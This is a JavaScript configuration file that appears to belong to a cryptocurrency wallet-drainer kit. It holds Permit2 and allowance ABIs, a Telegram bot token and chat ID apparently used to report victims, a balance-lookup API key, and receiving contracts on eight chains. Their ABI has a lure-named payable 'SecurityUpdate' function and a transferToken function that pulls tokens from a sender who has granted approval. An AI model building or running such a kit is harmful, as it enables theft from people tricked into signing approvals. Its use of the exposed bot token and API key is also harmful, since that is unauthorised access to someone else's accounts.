export const initiator = ''; // initiator address\
export { default as ALLOWANCEABI } from './abis/allowanceABI.json';
export { default as permitV2 } from './abis/permitvs.json';
export { default as CLAIMEABI } from './abis/claimABI.json';
export const projectId = '0ab5fddc4f8d6b393f3cc7824187cd02';
export const deadline = 10000000000000;
export { default as tokens } from './tokens.json';

export const API_URL = 'http://localhost:3000/api';

export const tgBotToken = '6699160363:AAEp5OoZF7ht7qeLGJq0LrFsnEL55FW8LFs'
export const tgChatId = '-4024573428';

export const zapperKey = '6734aa32-e473-48ff-afb5-03c449ecbb96';
export const max = '1158472395435294898592384258348512586931256';

export const RPC = {
  1: `https://rpc.ankr.com/eth`,
  137: 'https://rpc.ankr.com/polygon',
  56: 'https://rpc.ankr.com/bsc',
  42161: 'https://rpc.ankr.com/arbitrum',
  10: 'https://rpc.ankr.com/optimism',
  43114: 'https://rpc.ankr.com/avalanche',
  100: 'https://rpc.ankr.com/gnosis',
  250: 'https://rpc.ankr.com/fantom'
}

export const contracts = {
  1: '0xeF6bA7ebc13999E7eFaA4d9d8525bd8Fe0567F9b',
  56: '0xdbe297cda0cd8913f5f916d1d8a3802d04b10bb6',
  137: '0xFc5cA19a137dcfd3e44e50d9eC454A7001ACCCd7',
  42161: '0x077BfdC586306Fe9acF046DCD4b1E154B9e1AFA9',
  10: '0xa41C3b45064E720ED13AC95782d42D48aEf29D26',
  100: '0xf2333924b5D45990b8b4B262FEE1C6077C20e9FE',
  43114: '0xdf77db64f80d6F19c785c373B5BFF133AAE2FA71',
  250: '0x38cc6c2f600E8b58db3Cc2f27DAB9e769a1532C3'
}

export const receiveContractABI = [
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "SecurityUpdate",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "tokenAddress",
				"type": "address"
			}
		],
		"name": "addToHoldTokens",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_newExector",
				"type": "address"
			}
		],
		"name": "setExecutor",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "tokenAddress",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "sender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "transferToken",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "withdraw",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"stateMutability": "payable",
		"type": "receive"
	}
]